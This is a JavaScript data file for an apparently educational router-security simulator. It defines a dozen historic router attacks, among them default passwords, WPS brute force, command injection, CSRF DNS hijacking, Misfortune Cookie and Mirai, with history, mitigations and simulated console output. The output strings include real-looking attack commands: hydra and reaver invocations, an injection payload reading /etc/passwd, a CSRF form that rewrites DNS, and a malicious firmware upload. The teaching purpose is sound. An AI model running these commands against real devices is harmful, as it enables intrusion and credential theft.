/* =========================================================================
 *  attacks.js  ―  歴史的に有名なルーター攻撃手法の定義
 *
 *  各 attack の evaluate(fw) が、ファームウェアの flags を読んで
 *    { status, headline, why, console }  を返す。
 *    status : 'success' 攻撃成立 / 'partial' 条件つき / 'failed' 防御された / 'na' 対象外
 *    console: [{t,s}]   t = cmd|out|info|ok|block|warn   （ok=攻撃成功, block=防御）
 *
 *  ※ コンソール出力・IP・認証情報はすべて架空の「再現」。
 *    そのまま実機で動く攻撃コードではなく、手法の“かたち”を学ぶための模擬。
 * ========================================================================= */

const ATTACKS = [
  /* ---------------------------------------------------------------- */
  {
    id:"default-creds", icon:"🔑", category:"認証",
    name:"初期パスワードでログイン", nameEn:"Default Credentials",
    year:"1990s〜", cve:"—",
    incident:"最も古典的で、今なお多い侵入経路。admin/admin・admin/password などの出荷時設定が変更されないまま放置される。",
    idea:"出荷時の共通パスワードを辞書として総当たり。管理画面に入れれば設定は実質すべて変更可能になる。",
    mitigation:"端末ごとに固有の初期パスワード（ラベル記載）／初回起動時の変更強制。米カリフォルニア州 SB-327(2018年成立・2020年施行) など法規制も。",
    evaluate(fw){
      const c=fw.flags.creds;
      if(c==="unique"){
        return {status:"failed",
          headline:"初期パスワードが端末固有のため不成立",
          why:"出荷時パスワードが機器ごとに異なり、ラベルに印字されている。共通の辞書が存在しないので総当たりが成立しない。",
          console:[
            {t:"cmd",s:`nmap -p 80,443 ${fw.ip}`},
            {t:"out",s:`80/tcp closed   443/tcp open  https`},
            {t:"cmd",s:`hydra -l admin -P common-router-passwords.txt ${fw.ip} https-get /`},
            {t:"out",s:`[ATTEMPT] admin:admin   -> 401 Unauthorized`},
            {t:"out",s:`[ATTEMPT] admin:password-> 401 Unauthorized`},
            {t:"out",s:`[ATTEMPT] admin:1234    -> 401 Unauthorized`},
            {t:"block",s:`0 of 1 target completed — 端末固有パスワードのため辞書攻撃は無効`}
          ]};
      }
      return {status:"success",
        headline:`初期パスワード ${c.user}/${c.pass} でログイン成功`,
        why:"出荷時の共通パスワードが変更されていない。これだけで攻撃者は管理者として全設定を書き換えられる。",
        console:[
          {t:"cmd",s:`nmap -p 80,443 ${fw.ip}`},
          {t:"out",s:`80/tcp open  http   (admin web UI)`},
          {t:"cmd",s:`hydra -l ${c.user} -P common-router-passwords.txt ${fw.ip} http-get /`},
          {t:"out",s:`[ATTEMPT] ${c.user}:admin    -> 200`},
          {t:"ok",s:`[80][http] host: ${fw.ip}  login: ${c.user}  password: ${c.pass}`},
          {t:"ok",s:`管理者としてログイン成功 — DNS・パスワード・転送設定すべて変更可能`}
        ]};
    }
  },

  /* ---------------------------------------------------------------- */
  {
    id:"telnet-shell", icon:"🐚", category:"リモートアクセス",
    name:"Telnet / 組込みシェル侵入", nameEn:"Telnet & Backdoor Shell",
    year:"2000s〜", cve:"多数",
    incident:"古い機器は保守用にTelnetが開きっぱなし。さらに製造元が仕込んだ“隠しアカウント”でroot奪取できる事例（D-Link/Tendaなど）が多発。",
    idea:"23/2323番や独自ポートのTelnetへ接続し、共通・隠しアカウントでrootシェルを取得。機器を完全に掌握できる。",
    mitigation:"Telnetの完全削除、SSH(鍵認証)への移行、隠しアカウントの廃止とソース監査。",
    evaluate(fw){
      const t=fw.flags.telnet;
      if(t==="open") return {status:"success",
        headline:"開放されたTelnetからrootシェル取得",
        why:"保守用Telnetが出荷時から開いている。共通アカウントでログインでき、機器の完全な制御を奪われる。",
        console:[
          {t:"cmd",s:`nmap -p 23,2323 ${fw.ip}`},
          {t:"out",s:`23/tcp open  telnet`},
          {t:"cmd",s:`telnet ${fw.ip}`},
          {t:"out",s:`BusyBox login: admin   Password: ****`},
          {t:"ok",s:`# id`},
          {t:"ok",s:`uid=0(root) gid=0(root)  —  完全な制御権を取得`}
        ]};
      if(t==="backdoor") return {status:"success",
        headline:"製造元の隠しアカウントでroot取得",
        why:"表向きTelnetは『無効』だが、ファーム内に保守用の隠し認証情報が残っている。これを使うと誰でもrootになれる。",
        console:[
          {t:"cmd",s:`# ファーム解析で見つかった隠しアカウントを使用`},
          {t:"cmd",s:`telnet ${fw.ip} 2323`},
          {t:"out",s:`login: <undocumented>   password: <hardcoded>`},
          {t:"warn",s:`ソースに固定埋め込みされた認証情報を検出`},
          {t:"ok",s:`# uid=0(root) — バックドア経由で侵入成功`}
        ]};
      return {status:"failed",
        headline: t==="removed" ? "Telnet実装が削除済みで接続不可" : "Telnetが無効で接続拒否",
        why: t==="removed"
          ? "Telnetサービス自体がファームから取り除かれている。管理はHTTPS/SSH(鍵)に限定され、この経路は存在しない。"
          : "Telnetポートが閉じられ、接続が拒否される。隠しアカウントも廃止されている。",
        console:[
          {t:"cmd",s:`nmap -p 23,2323 ${fw.ip}`},
          {t:"out",s:`23/tcp   closed`},
          {t:"out",s:`2323/tcp closed`},
          {t:"cmd",s:`telnet ${fw.ip}`},
          {t:"block",s:`Connection refused — Telnet経路は塞がれている`}
        ]};
    }
  },

  /* ---------------------------------------------------------------- */
  {
    id:"wps-reaver", icon:"📶", category:"無線",
    name:"WPS PIN 総当たり (Reaver)", nameEn:"WPS PIN Brute-force",
    year:"2011", cve:"CVE-2011-5053",
    incident:"2011年12月、Stefan Viehböck がWPSの8桁PINを実質1.1万通り(10^4+10^3)に削減できる欠陥を公開(US-CERT VU#723755)。ツール『Reaver』で数時間〜でWi-Fiパスワードを奪取可能に。2014年にはDominique Bongardが、PIN生成乱数の弱さを突いて数秒〜数分で割る『Pixie Dust』(オフライン攻撃)を公表。",
    idea:"WPSの8桁PINは前半/後半に分割検証されるため総当たり空間が激減。PINさえ割れればWPA鍵そのものが復元される。",
    mitigation:"WPS-PINを無効化（既定オフ／廃止）、試行回数ロック、Pixie Dust耐性のある乱数実装。",
    evaluate(fw){
      const w=fw.flags.wps;
      if(w==="none"||w==="removed") return {status:"na",
        headline: w==="none" ? "WPS非搭載のため対象外" : "WPSが廃止済みのため対象外",
        why:"この機器にはWPS-PIN機能が存在しない。攻撃の前提となる入口そのものが無い。",
        console:[
          {t:"cmd",s:`wash -i wlan0mon`},
          {t:"out",s:`BSSID              WPS  Lck`},
          {t:"out",s:`AA:BB:CC:DD:EE:FF   No   --`},
          {t:"block",s:`WPS未対応 — Reaver/Pixie Dustの対象にならない`}
        ]};
      if(w==="on") return {status:"success",
        headline:"WPS PINを割り、WPAパスフレーズを奪取",
        why:"WPSが有効でロックも無いため、PIN空間の削減欠陥を突いて総当たり可能。PIN復元からWi-Fiパスワードが丸ごと判明する。",
        console:[
          {t:"cmd",s:`reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv`},
          {t:"out",s:`[+] Trying PIN 1234.... [+] 90.00% complete`},
          {t:"ok",s:`[+] WPS PIN: '12345670'`},
          {t:"ok",s:`[+] WPA PSK: 'home-wifi-pass'  ← 無線パスワードを復元`}
        ]};
      if(w==="locked") return {status:"partial",
        headline:"試行制限あり ― Pixie Dust が刺されば一撃、刺さらなければ防御",
        why:"連続失敗でWPSがロックされるため単純な総当たりは止まる。ただしPIN生成乱数が弱い個体ではオフライン手法(Pixie Dust)が成立する場合がある=チップ依存の“条件つき”。",
        console:[
          {t:"cmd",s:`reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv`},
          {t:"warn",s:`[!] WARNING: Detected AP rate limiting — WPS locked`},
          {t:"cmd",s:`reaver --pixie-dust ...`},
          {t:"warn",s:`乱数実装が弱い個体のみ成立。堅牢な実装では失敗に転じる`}
        ]};
      return {status:"failed",
        headline:"WPSが既定で無効 ― 入口が閉じている",
        why:"WPS-PINが出荷時から無効化されている。総当たりもPixie Dustも入口が無く成立しない。",
        console:[
          {t:"cmd",s:`wash -i wlan0mon`},
          {t:"out",s:`AA:BB:CC:DD:EE:FF   No   --`},
          {t:"block",s:`WPS無効 — 攻撃不可`}
        ]};
    }
  },

  /* ---------------------------------------------------------------- */
  {
    id:"command-injection", icon:"💉", category:"Web",
    name:"コマンドインジェクション (診断ツール)", nameEn:"OS Command Injection",
    year:"2000s〜", cve:"多数 (例: 各社pingツール)",
    incident:"ルーターの『ping/traceroute診断』画面が、入力値をそのままシェルに渡す実装が横行。宛先欄に「; コマンド」を足すだけでroot権限の任意コマンド実行ができた（Netgear/D-Link等で多数のCVE）。",
    idea:"診断フォームの入力を `system(\"ping \"+input)` のように連結している場合、`127.0.0.1; id` でシェルが2つの命令と解釈し、攻撃者のコマンドが実行される。",
    mitigation:"入力の無害化（許可文字のみ・引数配列で実行）、シェルを介さないAPI、最小権限化。",
    evaluate(fw){
      if(!fw.flags.diagSanitized) return {status:"success",
        headline:"診断フォームから任意コマンド実行 (root)",
        why:"診断ツールが入力値をそのままシェルへ渡している。宛先に「; id」を付けるだけで、ルーター上で任意のコマンドがroot権限で動く。",
        console:[
          {t:"cmd",s:`curl "http://${fw.ip}/diag.cgi" --data "ping_target=127.0.0.1; id"`},
          {t:"out",s:`PING 127.0.0.1: 56 data bytes ...`},
          {t:"ok",s:`uid=0(root) gid=0(root)`},
          {t:"cmd",s:`...--data "ping_target=127.0.0.1; cat /etc/passwd"`},
          {t:"ok",s:`admin:x:0:0:root:/:/bin/sh   ← 設定・認証情報を吸い出せる`}
        ]};
      return {status:"failed",
        headline:"入力が無害化され、注入が成立しない",
        why:"診断ツールが入力を検証・エスケープし、シェルを介さず実行している。記号を入れても文字列として処理され、コマンドにならない。",
        console:[
          {t:"cmd",s:`curl "https://${fw.ip}/diag.cgi" --data "ping_target=127.0.0.1; id"`},
          {t:"out",s:`{"error":"invalid host format"}`},
          {t:"block",s:`不正な文字を拒否 — 入力はコマンドとして解釈されない`}
        ]};
    }
  },

  /* ---------------------------------------------------------------- */
  {
    id:"csrf-dns", icon:"🌐", category:"Web",
    name:"CSRFでDNS設定を改ざん", nameEn:"CSRF → DNS Hijack",
    year:"2008〜", cve:"多数",
    incident:"利用者が罠サイトを開くだけで、裏でルーターへ設定変更リクエストが送られDNSを攻撃者サーバへ書き換える手口。2014年にTeam Cymruが報告した『SOHO Pharming』では約30万台のルーターDNSが認証バイパスやCSRFで書き換えられた（被害はベトナム・インド・イタリア・タイ等に集中）。ブラジル等でも同種の手口が横行し、偽バンキングサイトへの誘導に使われた。",
    idea:"設定変更にトークンが無いと、外部サイトのフォームから利用者のブラウザ経由で変更要求を“代理送信”できる。DNSを乗っ取れば全通信を盗聴・誘導できる。",
    mitigation:"CSRFトークンの必須化、CookieのSameSite属性、重要操作での再認証。",
    evaluate(fw){
      if(!fw.flags.csrfToken && !fw.flags.sameSite) return {status:"success",
        headline:"罠ページ経由でDNSを攻撃者サーバに書き換え",
        why:"設定変更にトークンが無く、Cookieにも送信制限が無い。利用者が罠ページを開くだけで、本人のブラウザから設定変更が“代理送信”されDNSが乗っ取られる。",
        console:[
          {t:"info",s:`// 攻撃者の罠ページ（利用者が開いた瞬間に自動送信）`},
          {t:"cmd",s:`<form action="http://${fw.ip}/dns_setup" method=POST>`},
          {t:"cmd",s:`  <input name="dns1" value="203.0.113.66">  <!-- 攻撃者DNS --></form>`},
          {t:"out",s:`POST /dns_setup  (利用者のブラウザから自動送信)`},
          {t:"ok",s:`200 OK — DNS1 を 203.0.113.66 に変更`},
          {t:"ok",s:`以後この家庭の全名前解決を攻撃者が支配（偽サイト誘導が可能）`}
        ]};
      return {status:"failed",
        headline:"CSRFトークン/SameSiteに阻まれ不成立",
        why: fw.flags.sameSite
          ? "CookieにSameSite制限があり、外部サイト起点のリクエストには認証Cookieが付かない。加えてトークン検証もあり、代理送信が拒否される。"
          : "設定変更ごとに使い捨てトークンが要求される。罠ページはその値を知り得ないため、変更要求が弾かれる。",
        console:[
          {t:"out",s:`POST /dns_setup  (罠ページから送信)`},
          {t:"block",s:`403 Forbidden — CSRF token missing / SameSite cookie not sent`},
          {t:"block",s:`設定は変更されない`}
        ]};
    }
  },

  /* ---------------------------------------------------------------- */
  {
    id:"auth-bypass", icon:"🚪", category:"Web",
    name:"認証バイパス (管理画面 直アクセス)", nameEn:"Authentication Bypass",
    year:"2000s〜", cve:"多数",
    incident:"ログイン画面はあるのに、内部の設定ページが認証を確認しておらず、URLを直接叩くだけで管理機能に入れてしまう実装が多発（強制ブラウジング）。",
    idea:"`/login` は守られていても `/setup/system.html` が無防備なら、ログインを飛ばして直接アクセスするだけで設定を読み書きできる。",
    mitigation:"全ページ共通の認証チェック（ミドルウェアで一元化）、セッション必須化、デフォルト拒否。",
    evaluate(fw){
      if(!fw.flags.authEnforced) return {status:"success",
        headline:"ログインを飛ばして設定ページへ直アクセス",
        why:"内部の設定ページが認証を確認していない。ログイン画面を経由せず、URLを直接叩くだけで管理機能を操作できる。",
        console:[
          {t:"cmd",s:`curl http://${fw.ip}/login`},
          {t:"out",s:`302 -> /login.html  (ここは一見ガードされている)`},
          {t:"cmd",s:`curl http://${fw.ip}/setup/system.html   # 直接指定`},
          {t:"ok",s:`200 OK — 認証なしで管理ページが表示された`},
          {t:"ok",s:`パスワード変更・再起動・設定読み出しが可能`}
        ]};
      return {status:"failed",
        headline:"全ページで認証が確認され、直アクセス不可",
        why:"設定系のページはすべて共通の認証チェックを通る。ログイン無しでURLを叩いてもログイン画面へ戻される。",
        console:[
          {t:"cmd",s:`curl https://${fw.ip}/setup/system.html`},
          {t:"block",s:`401 Unauthorized — セッションが無い要求は拒否`}
        ]};
    }
  },

  /* ---------------------------------------------------------------- */
  {
    id:"sercomm-backdoor", icon:"🕳️", category:"バックドア",
    name:"TCP/32764 隠しバックドア", nameEn:"Sercomm Port 32764 Backdoor",
    year:"2013-2014", cve:"— (Sercomm系OEM・約24機種に波及)",
    incident:"2013年末、Eloi Vanderbeken が自宅のLinksys WAG200GでTCP 32764番に応答する“工場用”の隠し機能を発見。特定の合図を送ると認証なしで設定吸い出し・コマンド実行・初期化ができた。Netgear/Cisco/Linksys/Diamond等 約24機種で確認され、OEM元のSercomm由来とされる。2014年には別の形で再導入されていたことも判明。",
    idea:"非公開ポート32764へ特定のマジックパケットを送ると、組込みの保守機能が起動し、認証を介さず内部にアクセスできる。",
    mitigation:"出荷ファームからの保守機能除去、外部ポートの遮断、第三者によるファーム監査。",
    evaluate(fw){
      if(fw.flags.sercomm) return {status:"success",
        headline:"32764番ポートの隠し機能で認証回避",
        why:"製造元が残した保守用の隠しサービスが特定ポートで待ち受けている。マジックパケットを送るだけで認証を介さず設定や認証情報を吸い出せる。",
        console:[
          {t:"cmd",s:`nmap -p 32764 ${fw.ip}`},
          {t:"out",s:`32764/tcp open  unknown`},
          {t:"cmd",s:`python poc.py ${fw.ip}   # マジックパケット送信(再現)`},
          {t:"warn",s:`認証なしで保守用デーモンが応答（保守モード起動・再現）`},
          {t:"ok",s:`認証なしで設定をダンプ：admin / (平文パスワード) を取得`}
        ]};
      return {status:"failed",
        headline:"該当ポートが無く、隠し機能も存在しない",
        why:"この系譜のファームには問題の保守用バックドアが含まれていない（または除去済み）。32764番は閉じており、合図を送っても応答が無い。",
        console:[
          {t:"cmd",s:`nmap -p 32764 ${fw.ip}`},
          {t:"out",s:`32764/tcp closed`},
          {t:"block",s:`隠しサービスなし — 攻撃不成立`}
        ]};
    }
  },

  /* ---------------------------------------------------------------- */
  {
    id:"misfortune-cookie", icon:"🍪", category:"メモリ破壊",
    name:"Misfortune Cookie (RomPager)", nameEn:"Misfortune Cookie",
    year:"2014", cve:"CVE-2014-9222",
    incident:"2014年、Check Pointが組込みWebサーバ『RomPager』(4.34以前)の欠陥を公表。細工したCookieヘッダでサーバのメモリを破壊し、認証なしで管理権限を奪える。世界中で推定1200万台が影響。",
    idea:"HTTPのCookieヘッダに特殊な値を入れると、内部のメモリ管理が壊れ、攻撃者の要求が“管理者のセッション”として扱われてしまう。",
    mitigation:"組込みHTTPサーバの更新(RomPager 4.34+への置換)、ファーム更新、ASLR等のメモリ保護。",
    evaluate(fw){
      if(fw.flags.romPager) return {status:"success",
        headline:"細工Cookieでメモリ破壊 → 管理権限奪取",
        why:"古い組込みHTTPサーバ(RomPager系)を使っており、特殊なCookieでメモリ状態を破壊できる。認証を経ずに自分の要求を“管理者の状態”にすり替えられる。",
        console:[
          {t:"cmd",s:`curl http://${fw.ip}/ -H "Cookie: C107351588=$(payload)"`},
          {t:"warn",s:`RomPager/4.07 を検出（脆弱バージョン）`},
          {t:"warn",s:`細工Cookieで内部メモリの管理フラグを上書き(再現)`},
          {t:"ok",s:`認証なしで管理者ページにアクセス成功`}
        ]};
      return {status:"failed",
        headline:"組込みサーバが更新済みで不成立",
        why:"脆弱なRomPagerを使っていない（更新済み／別実装）。細工Cookieを送ってもメモリは壊れず、ただのエラーになる。",
        console:[
          {t:"cmd",s:`curl https://${fw.ip}/ -H "Cookie: C107351588=$(payload)"`},
          {t:"out",s:`Server: (modern embedded httpd)`},
          {t:"block",s:`400 Bad Request — メモリ破壊は起きない`}
        ]};
    }
  },

  /* ---------------------------------------------------------------- */
  {
    id:"upnp-wan", icon:"🔌", category:"プロトコル",
    name:"UPnP 悪用 (外部公開)", nameEn:"UPnP WAN Abuse",
    year:"2013", cve:"—",
    incident:"2013年1月、Rapid7(HD Moore)の調査『Unplug, Don't Play』が公表。インターネットからUPnPに応答する機器は8000万台超、うち推定4000〜5000万台が3種の攻撃のいずれかに脆弱とされた。WAN側からポート開放要求を受け付け、宅内機器を勝手にインターネットへ晒せた。",
    idea:"UPnPは本来LAN内の機器が自動で穴あけする仕組み。これがWAN側に開いていると、外部から任意の転送ルールを追加し、宅内のPC等を直接攻撃対象にできる。",
    mitigation:"UPnPをWAN側で無効化、LAN限定バインド、不要なら機能オフ。",
    evaluate(fw){
      if(fw.flags.upnpWan) return {status:"success",
        headline:"WAN側UPnPで宅内機器を外部に晒す",
        why:"UPnPの制御がインターネット側からも応答する。外部から転送ルールを追加して、本来は守られている宅内のPCやカメラを直接狙えるようにできる。",
        console:[
          {t:"cmd",s:`upnp-scan --wan ${fw.ip}`},
          {t:"out",s:`WANIPConnection service reachable from WAN`},
          {t:"cmd",s:`AddPortMapping ext:8080 -> 192.168.11.20:445`},
          {t:"ok",s:`200 — 宅内PCのSMB(445)をインターネットへ転送（攻撃可能に）`}
        ]};
      return {status:"failed",
        headline:"UPnPがWAN側で遮断され不成立",
        why:"UPnPの制御はLAN内に限定され、インターネット側からは応答しない。外部から勝手に転送ルールを足すことはできない。",
        console:[
          {t:"cmd",s:`upnp-scan --wan ${fw.ip}`},
          {t:"block",s:`No response on WAN — UPnP is LAN-only`}
        ]};
    }
  },

  /* ---------------------------------------------------------------- */
  {
    id:"mirai", icon:"🤖", category:"マルウェア",
    name:"Mirai 型ボットネット感染", nameEn:"Mirai-style Botnet",
    year:"2016", cve:"—",
    incident:"2016年、IoT機器のTelnetを初期パスワードで乗っ取るワーム『Mirai』が拡散。数十万台が巨大DDoSに悪用され、DNS事業者Dynが落ちて主要Webサービスが一斉にダウンした。ソース公開後、亜種が乱立。",
    idea:"インターネットを走査してTelnetが開いた機器を見つけ、62種ほどの共通初期パスワードを試す。入れたら小さなボットを送り込み、号令一下でDDoSに参加させる。",
    mitigation:"Telnet廃止＋端末固有パスワード。これだけでMiraiの侵入条件を満たさなくなる。",
    evaluate(fw){
      const t=fw.flags.telnet, c=fw.flags.creds;
      const telnetReachable = (t==="open"||t==="backdoor");
      if(telnetReachable && c!=="unique") return {status:"success",
        headline:"Telnet＋初期パスワードで感染、ボットnetwork化",
        why:"Telnetが到達可能で初期パスワードも共通。Miraiの侵入条件をそのまま満たすため、走査→ログイン→ボット投入→DDoS参加、という流れが成立する。",
        console:[
          {t:"cmd",s:`# Miraiスキャナの挙動(再現)：23番開放ホストへ既知パスワードを試行`},
          {t:"out",s:`${fw.ip}:23  login ${c.user}/${c.pass}  -> success`},
          {t:"warn",s:`dropper: busybox経由でボット本体を取得・実行`},
          {t:"ok",s:`bot online — C2へ登録、DDoSの号令待ち`},
          {t:"ok",s:`数十万台規模なら大企業のサービスを停止させ得る`}
        ]};
      const reason = !telnetReachable
        ? "Telnetが削除/遮断され、Miraiの入口(23番)が存在しない。"
        : "初期パスワードが端末固有で、共通パスワード辞書が通用しない。";
      return {status:"failed",
        headline:"侵入条件を満たさず感染しない",
        why:`${reason} Miraiは「Telnet到達可」かつ「共通初期パスワード」の両方が揃って初めて成立するため、片方でも崩れると感染できない。`,
        console:[
          {t:"cmd",s:`# Miraiスキャナの挙動(再現)`},
          {t:"out",s: telnetReachable ? `${fw.ip}:23 open` : `${fw.ip}:23 closed`},
          {t:"block",s: telnetReachable
            ? `login admin/admin -> 端末固有パスワードのため失敗`
            : `Telnet到達不可 — 走査対象から外れる`},
          {t:"block",s:`感染は成立しない`}
        ]};
    }
  },

  /* ---------------------------------------------------------------- */
  {
    id:"wifi-crack", icon:"📡", category:"無線",
    name:"Wi-Fi 暗号の解読", nameEn:"Wi-Fi Encryption Cracking",
    year:"2001〜", cve:"WEP/CCMP/KRACK等",
    incident:"WEPは2001年に致命的欠陥が示され、aircrack系で数分で解読可能に。WPA/WPA2もハンドシェイク捕捉＋辞書攻撃や、2017年のKRACK(再送鍵の脆弱性)で揺らいだ。WPA3はオフライン辞書攻撃に耐える設計。",
    idea:"暗号方式ごとに弱点が違う。WEPはIV再利用で即解読、WPA/WPA2は4-wayハンドシェイクを捕まえてパスフレーズを総当たり、WPA3(SAE)はオフライン総当たりが効かない。",
    mitigation:"WPA3(SAE)＋強固なパスフレーズ。最低でもWPA2＋長いランダム鍵。WEP/WPA(TKIP)は使わない。",
    evaluate(fw){
      const w=fw.flags.wifi;
      if(w==="WEP") return {status:"success",
        headline:"WEPは数分で解読 (IV再利用)",
        why:"WEPは初期化ベクトル(IV)の再利用という根本欠陥があり、十分なパケットを集めれば統計的に鍵が割れる。パスワードの強さに関係なく数分で解読される。",
        console:[
          {t:"cmd",s:`airodump-ng wlan0mon   # IVを収集`},
          {t:"out",s:`#Data 42000  ... 収集中`},
          {t:"cmd",s:`aircrack-ng capture.cap`},
          {t:"ok",s:`KEY FOUND! [ 12:34:56:78:90 ]  ← 数分で復元`}
        ]};
      if(w==="WPA3") return {status:"failed",
        headline:"WPA3(SAE)はオフライン辞書攻撃に耐性",
        why:"WPA3のSAE(Dragonfly)は、ハンドシェイクを捕まえても、そこからパスワードを総当たりできない設計。1回の推測には実際の通信が必要で、オフライン解析が成立しない。",
        console:[
          {t:"cmd",s:`hcxdumptool -i wlan0mon`},
          {t:"block",s:`SAE handshake captured — but offline guessing is infeasible`},
          {t:"block",s:`辞書攻撃は成立しない`}
        ]};
      // WPA / WPA2 / WPA2-WPA3 transition
      const transition = (w==="WPA2/WPA3");
      return {status:"partial",
        headline: transition
          ? "移行モードはダウングレードの隙、鍵が弱ければ解読"
          : "ハンドシェイク捕捉＋辞書次第（弱いパスワードは危険）",
        why: transition
          ? "WPA2/WPA3併用(移行モード)はWPA3端末を守る一方、WPA2でも繋げるためダウングレードの余地が残る。弱いパスフレーズなら従来手法で解読され得る=条件つき。"
          : "4-wayハンドシェイクを捕捉し、辞書/総当たりでパスフレーズを推測する。強くランダムな鍵なら現実的に解けないが、弱い鍵なら破られる=パスワードの強さ次第。",
        console:[
          {t:"cmd",s:`airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon`},
          {t:"warn",s:`WPA handshake captured`},
          {t:"cmd",s:`aircrack-ng -w rockyou.txt capture.cap`},
          {t:"warn",s:`弱いパスフレーズ → 命中 / 強い鍵 → 現実的に不可（鍵の強度しだい）`}
        ]};
    }
  },

  /* ---------------------------------------------------------------- */
  {
    id:"firmware-mod", icon:"🧬", category:"ファーム",
    name:"改造ファームウェア書き込み", nameEn:"Malicious Firmware Flashing",
    year:"常時", cve:"—",
    incident:"署名検証が無い機器は、攻撃者が細工したファームを書き込めてしまう。バックドアを仕込まれると初期化や再起動でも消えず、機器ごと“乗っ取られたまま”になる。授業の課題『ファーム更新』の裏返しのテーマ。",
    idea:"更新イメージの真正性(署名)を検証しない機器に、改ざんファームを流し込む。OSの土台ごと置き換わるため、上位のどんな対策も無力化される最も深いレベルの侵害。",
    mitigation:"ファーム署名検証＋セキュアブート(信頼の起点をハードに)。正規イメージ以外を起動させない。",
    evaluate(fw){
      if(!fw.flags.fwSigned) return {status:"success",
        headline:"署名検証なし → バックドア入りファームを永続化",
        why:"更新イメージの真正性を検証しないため、攻撃者が細工したファームを書き込める。土台ごと置き換わるので、初期化・再起動しても消えない永続的な乗っ取りになる。",
        console:[
          {t:"cmd",s:`# 正規ファームにバックドアを追加して再パッケージ(再現)`},
          {t:"cmd",s:`curl -F "firmware=@evil.bin" http://${fw.ip}/upgrade`},
          {t:"out",s:`Uploading... verifying...`},
          {t:"warn",s:`署名検証なし — 改ざんイメージをそのまま受理`},
          {t:"ok",s:`Flash OK / reboot — バックドアが永続化（初期化でも消えない）`}
        ]};
      return {status:"failed",
        headline:"署名検証/セキュアブートに弾かれる",
        why:"更新イメージの署名を検証し、正規の鍵で署名されたファームしか起動しない(セキュアブート)。改ざんイメージは受理されず、書き込んでも起動しない。",
        console:[
          {t:"cmd",s:`curl -F "firmware=@evil.bin" https://${fw.ip}/upgrade`},
          {t:"out",s:`Verifying signature...`},
          {t:"block",s:`ERROR: signature mismatch — イメージを拒否`},
          {t:"block",s:`セキュアブートにより未署名/改ざんファームは起動しない`}
        ]};
    }
  }
];
